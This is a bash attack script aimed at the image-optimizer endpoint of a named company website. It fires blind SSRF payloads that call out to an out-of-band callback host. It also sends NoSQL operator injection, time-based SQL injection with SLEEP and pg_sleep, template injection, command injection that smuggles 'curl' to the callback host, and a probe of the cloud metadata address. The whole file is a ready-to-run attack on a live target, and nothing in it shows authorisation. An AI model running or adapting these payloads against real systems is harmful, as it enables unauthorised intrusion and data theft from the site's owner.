#!/bin/bash
# Fire OOB-bearing payloads at the _next/image optimizer and other sinks.
WD="$WORK_PATH"; cd "$WD" || exit 1
SQH="oob412911e44e41.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
NSH="oob02b45f92f28a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
B="https://www.infinitycapital.bh"

hit () { # label, url
  code=$(curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" --max-time 20 "$2")
  echo "$1 => $code"
}

echo "### image url = OOB host (DNS/HTTP callback => blind SSRF / sqli sink) ###"
hit "img_url_oob"      "$B/_next/image?url=http%3A%2F%2F${SQH}%2Fssrf.jpg&w=1080&q=75"
hit "img_url_oob_bare" "$B/_next/image?url=${SQH}&w=1080&q=75"

echo "### NoSQLi-style operator injection on url/w/q ###"
hit "nosqli_ne"  "$B/_next/image?url[\$ne]=x&w=1080&q=75"
hit "nosqli_ne2" "$B/_next/image?w[\$gt]=0&q=75&url=https%3A%2F%2Fexample.com%2Fa.jpg"
hit "nosqli_regex" "$B/_next/image?url[\$regex]=.*&w=1080&q=75"

echo "### blind time-based SQLi in w/q ###"
hit "sqli_sleep_w" "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080%20AND%20SLEEP(3)&q=75"
hit "sqli_sleep_q" "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75%20AND%20SLEEP(3)"
hit "sqli_stacked" "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080;q=75;SELECT%20pg_sleep(3)"

echo "### SSTI / CMDi in image params ###"
hit "ssti_url" "$B/_next/image?url={{7*7}}&w=1080&q=75"
hit "cmdi_url" "$B/_next/image?url=;curl%20http%3A%2F%2F${SQH}%2Fcmdi&w=1080&q=75"
hit "cmdi_w"   "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080%60curl%20${SQH}%60&q=75"

echo "### metadata SSRF ###"
hit "meta" "$B/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=1080&q=75"

echo "DONE"
